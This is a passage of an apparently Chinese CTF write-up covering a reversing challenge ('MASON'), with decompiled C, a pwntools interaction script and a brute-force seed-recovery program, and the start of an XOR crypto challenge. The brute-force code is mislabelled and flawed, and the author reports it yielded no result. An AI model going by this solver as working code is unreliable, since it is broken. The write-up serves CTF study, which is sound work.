+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-3-2.png" alt="11"></p>
+<h3 id="2-4-Evil-Eval-Aha"><a href="#2-4-Evil-Eval-Aha" class="headerlink" title="2-4 Evil Eval [Aha!]"></a><strong>2-4 Evil Eval [Aha!]</strong></h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/nPRd3TLyFMCDf-S1gkhaCg.jpeg" alt="12"></p>
+<h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h2><h3 id="3-1-Sanity-Check"><a href="#3-1-Sanity-Check" class="headerlink" title="3-1 Sanity Check"></a><strong>3-1 Sanity Check</strong></h3><p>逆向的第一道题，直接使用逆向工具打开即可。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/dnuchhhOzEH1SUkK4IxdTw.png" alt="13">    </p>
+<h3 id="3-2-MASON-Aha"><a href="#3-2-MASON-Aha" class="headerlink" title="3-2 MASON[Aha!]"></a><strong>3-2 MASON</strong><strong>[Aha!]</strong></h3><p>题目提供了ELF程序，该程序通过读取flag.txt中的字符串，并以该字符串作为种子，产生随机数生成加法公式。思路在于，通过交互程序首先判断字符串的长度并记录随机产生的数字，随后根据这些随机产生的数字，利用程序爆破的方式对原字符串进行还原。</p>
+<p><strong>主函数逻辑</strong></p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sdGz0iLYlrDRW3HbY-DLsQ.png" alt="14">     </p>
+<p>读取flag.txt文件中的字符串</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WI_JGGuyjQESWemayXrc9w.png" alt="15">        </p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0L_WvOZqD1D1jUi7MfoJaw.png" alt="16"> </p>
+<p>reseed函数是读取字符串的四个字符，并以他们在内存当中的数据作为随机数产生的种子。__int64 s就是字符串的首地址，DWORD是双字，也就是四个字节，即四个字符。该函数，就相当于以首地址为基址，以4*i为偏移，大小为四个字节的字符串作为随机数产生的种子。</p>
+<p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/q2ZI1sUX3Ru4eR-ZUn0rWw.png" alt="17"></p>
+<p>l1 函数即根据产生的字符串构造随机的加法公式，并计算结果。同时判断后续用户输入的结果是否为正确答案。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">bool <span class="token function">l1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token class-name">size_t</span> v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-2B0h]</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2ACh]</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>endptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-2A8h] BYREF</span>
+  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-2A0h]</span>
+  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-298h]</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-290h] BYREF</span>
+  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-288h]</span>
+  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-280h]</span>
+  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-278h]</span>
+  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-270h]</span>
+  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-268h]</span>
+  __int64 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-260h]</span>
+  __int64 v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-258h]</span>
+  __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-250h]</span>
+  __int64 v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-248h]</span>
+  __int64 v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-240h]</span>
+  __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-238h]</span>
+  __int64 v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+80h] [rbp-230h]</span>
+  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-228h]</span>
+  __int64 v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-220h]</span>
+  __int64 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp-218h]</span>
+  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A0h] [rbp-210h] BYREF</span>
+  __int64 v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+A8h] [rbp-208h]</span>
+  <span class="token keyword">char</span> v26<span class="token punctuation">[</span><span class="token number">496</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-200h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v27<span class="token punctuation">;</span> <span class="token comment">// [rsp+2A8h] [rbp-8h]</span>
+
+
+  v27 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//  2, 4,6,8,10,12。决定加法的项数</span>
+  v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v25 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token function">memset</span><span class="token punctuation">(</span>v26<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v26<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">do</span>
+  <span class="token punctuation">&#123;</span>
+    v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1000000</span><span class="token punctuation">;</span>                    <span class="token comment">// 0-63</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v11 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v12 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v13 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v14 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v15 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v16 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v17 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v18 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v19 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v20 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v21 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v22 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    v23 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+      v0 <span class="token operator">=</span> <span class="token string">"= ?"</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+      v0 <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">;</span>
+    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%d %s "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v6 <span class="token operator">+=</span> v4<span class="token punctuation">;</span>
+    <span class="token operator">--</span>v3<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token keyword">do</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      v7 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>endptr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">!=</span> endptr <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> v7 <span class="token operator">==</span> v6<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>依据pwntool，通过自动化地交互，我们得到了字符串的长度以及相关信息。由于服务器已经关闭，所以我们只能采用本地模拟的方式。而且我猜测字符串的长度一定是4的倍数。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> re
+pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d+\.?\d*'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># conn = remote('challenges.uactf.com.au',30001)</span>
+conn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./mason'</span><span class="token punctuation">)</span>
+num_add <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+num_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    num_all_int <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    result <span class="token operator">=</span> <span class="token number">0</span>
+    str_add <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"concive add :"</span><span class="token operator">+</span> str_add<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token string">"broadcast"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>str_add<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num_add is :"</span> <span class="token punctuation">,</span> num_add<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num_1 is:"</span><span class="token punctuation">,</span> num_1<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the length of flag is "</span><span class="token punctuation">,</span> x<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span>
+    num_add<span class="token punctuation">.</span>append<span class="token punctuation">(</span> str_add<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+    num_all <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>str_add<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> num_all<span class="token punctuation">:</span>
+        result <span class="token operator">+=</span><span class="token builtin">int</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span>
+        num_all_int<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all add number:"</span> <span class="token punctuation">,</span>num_all_int<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the add result:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    num_1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num_all<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    
+    conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"send the add result......"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"after the send:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#conn.recvuntil("Voice")</span>
+    <span class="token comment">#after_recv = str(conn.recvline(keepends=True))</span>
+    <span class="token comment">#print("server send :"+after_recv)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再通过给出的write_up,即遍历所有可能出现的字符，进行爆破。tab_size中存储的是加数的个数、tab中存放的是每个加法公式中加数。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include &lt;stdio.h></span>
+<span class="token comment">#include &lt;stdlib.h></span>
+<span class="token builtin">int</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    __int32_t res<span class="token punctuation">,</span> check<span class="token punctuation">;</span>
+    __int8_t i<span class="token punctuation">;</span>
+    <span class="token builtin">int</span> tab_size<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token builtin">int</span> tab<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token punctuation">&#123;</span><span class="token number">9022031</span><span class="token punctuation">,</span> <span class="token number">12357936</span><span class="token punctuation">,</span> <span class="token number">2415318</span><span class="token punctuation">,</span> <span class="token number">16184558</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">16448419</span><span class="token punctuation">,</span> <span class="token number">7237420</span><span class="token punctuation">,</span> <span class="token number">9131202</span><span class="token punctuation">,</span> <span class="token number">11715763</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">8957279</span><span class="token punctuation">,</span> <span class="token number">10863672</span><span class="token punctuation">,</span> <span class="token number">2527773</span><span class="token punctuation">,</span> <span class="token number">13853931</span><span class="token punctuation">,</span> <span class="token number">12889127</span><span class="token punctuation">,</span> <span class="token number">15656069</span><span class="token punctuation">,</span> <span class="token number">6045003</span><span class="token punctuation">,</span> <span class="token number">13312869</span><span class="token punctuation">,</span> <span class="token number">6678458</span><span class="token punctuation">,</span> <span class="token number">15383265</span><span class="token punctuation">,</span> <span class="token number">6123571</span><span class="token punctuation">,</span> <span class="token number">3391779</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">5455897</span><span class="token punctuation">,</span> <span class="token number">15833397</span><span class="token punctuation">,</span> <span class="token number">7054469</span><span class="token punctuation">,</span> <span class="token number">14893700</span><span class="token punctuation">,</span> <span class="token number">5641234</span><span class="token punctuation">,</span> <span class="token number">12370933</span><span class="token punctuation">,</span> <span class="token number">10464366</span><span class="token punctuation">,</span> <span class="token number">8737845</span><span class="token punctuation">,</span> <span class="token number">8588291</span><span class="token punctuation">,</span> <span class="token number">6607650</span><span class="token punctuation">,</span> <span class="token number">14087216</span><span class="token punctuation">,</span> <span class="token number">6475796</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">7118560</span><span class="token punctuation">,</span> <span class="token number">5373450</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">10279125</span><span class="token punctuation">,</span> <span class="token number">6020706</span><span class="token punctuation">,</span> <span class="token number">3765174</span><span class="token punctuation">,</span> <span class="token number">3355417</span><span class="token punctuation">,</span> <span class="token number">13626908</span><span class="token punctuation">,</span> <span class="token number">5507900</span><span class="token punctuation">,</span> <span class="token number">12989108</span><span class="token punctuation">,</span> <span class="token number">6401031</span><span class="token punctuation">,</span> <span class="token number">12006999</span><span class="token punctuation">,</span> <span class="token number">3447729</span><span class="token punctuation">,</span> <span class="token number">5329581</span><span class="token punctuation">,</span> <span class="token number">11520997</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">5455897</span><span class="token punctuation">,</span> <span class="token number">15833397</span><span class="token punctuation">,</span> <span class="token number">7054469</span><span class="token punctuation">,</span> <span class="token number">14893700</span><span class="token punctuation">,</span> <span class="token number">5641234</span><span class="token punctuation">,</span> <span class="token number">12370933</span><span class="token punctuation">,</span> <span class="token number">10464366</span><span class="token punctuation">,</span> <span class="token number">8737845</span><span class="token punctuation">,</span> <span class="token number">8588291</span><span class="token punctuation">,</span> <span class="token number">6607650</span><span class="token punctuation">,</span> <span class="token number">14087216</span><span class="token punctuation">,</span> <span class="token number">6475796</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span><span class="token number">16563743</span><span class="token punctuation">,</span> <span class="token number">15315034</span><span class="token punctuation">,</span> <span class="token number">15623837</span><span class="token punctuation">,</span> <span class="token number">10300268</span><span class="token punctuation">,</span> <span class="token number">11825995</span><span class="token punctuation">,</span> <span class="token number">8497235</span><span class="token punctuation">,</span> <span class="token number">5756897</span><span class="token punctuation">,</span> <span class="token number">2373671</span><span class="token punctuation">,</span> <span class="token number">6551149</span><span class="token punctuation">,</span> <span class="token number">181825</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token builtin">len</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token builtin">len</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token builtin">len</span><span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c1 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c1 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c1<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c2 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c2 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c2<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c3 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c3 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c3<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>
+                <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c4 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c4 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c4<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>
+                    <span class="token punctuation">&#123;</span>
+                        i <span class="token operator">=</span> c1 <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c3 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c4 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        srand<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> tab_size<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                        <span class="token punctuation">&#123;</span>
+                            check <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tab_size<span class="token punctuation">;</span> j<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>
+                            <span class="token punctuation">&#123;</span>
+                                res <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1000000</span><span class="token punctuation">;</span>
+                                <span class="token keyword">if</span> <span class="token punctuation">(</span>tab<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> res<span class="token punctuation">)</span>
+                                <span class="token punctuation">&#123;</span>
+                                    check <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                                    <span class="token keyword">break</span><span class="token punctuation">;</span>
+                                <span class="token punctuation">&#125;</span>
+                            <span class="token punctuation">&#125;</span>
+                            <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">)</span>
+                            <span class="token punctuation">&#123;</span>
+                                printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span>
+                        <span class="token punctuation">&#125;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在程序运算一段时间过后，可惜并没有得出运算结果。但是总体上的思路应该是没有问题。在得到最终结果后，需转换为十六进制，再根据大端存储对原来的字符串进行还原。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="4-1-Non-textual-Troubles"><a href="#4-1-Non-textual-Troubles" class="headerlink" title="4-1 Non-textual Troubles"></a><strong>4-1 Non-textual Troubles</strong></h3><p>基础的异或加密。题目提供了一个用于加密的 python 程序。</p>
+<p>题目代码主要是从 plaintext.txt 读取明文，利用随机数和字符Unicode码进行异或操作，进而生成密文写入 ciphertext.txt 当中。本题的关键在于加密过程的可逆性，首先随机数使用了种子机制，因此每次生成的随机数是相同的，其次异或操作存在 A^B = C，C^B = A，因此仅需进行相同的加密操作即可。</p>
